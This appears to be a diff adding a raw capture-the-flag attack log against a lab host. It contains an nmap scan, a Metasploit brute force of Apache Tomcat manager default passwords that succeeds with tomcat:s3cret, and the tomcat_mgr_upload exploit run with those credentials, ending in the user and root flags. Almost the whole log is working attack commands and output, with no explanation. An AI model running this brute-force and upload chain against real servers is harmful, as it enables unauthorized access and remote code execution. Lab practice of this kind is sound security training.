@@ -1,0 +1,132 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-24 14:32 UTC
+Nmap scan report for 10.10.10.95
+Host is up (0.048s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds
+
+msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
+RHOSTS => 10.10.10.95
+msf auxiliary(scanner/http/tomcat_mgr_login) > show options
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                                 Required  Description
+   ----              ---------------                                                                 --------  -----------
+   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
+   PASSWORD                                                                                          no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS            10.10.10.95                                                                     yes       The target address range or CIDR identifier
+   RPORT             8080                                                                            yes       The target port (TCP)
+   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                                               yes       The number of concurrent threads
+   USERNAME                                                                                          no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                            yes       Whether to print output for all attempts
+   VHOST                                                                                             no        HTTP server virtual host
+
+msf auxiliary(scanner/http/tomcat_mgr_login) > exploit
+
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
+[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
+[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+msf > use exploit/multi/http/tomcat_mgr_upload
+msf exploit(multi/http/tomcat_mgr_upload) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                          yes       The target address
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
+   VHOST                          no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+msf exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.10.95
+rhost => 10.10.10.95
+msf exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
+httppassword => s3cret
+msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
+httpusername => tomcat
+msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
+rport => 8080
+msf exploit(multi/http/tomcat_mgr_upload) > exploit
+
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
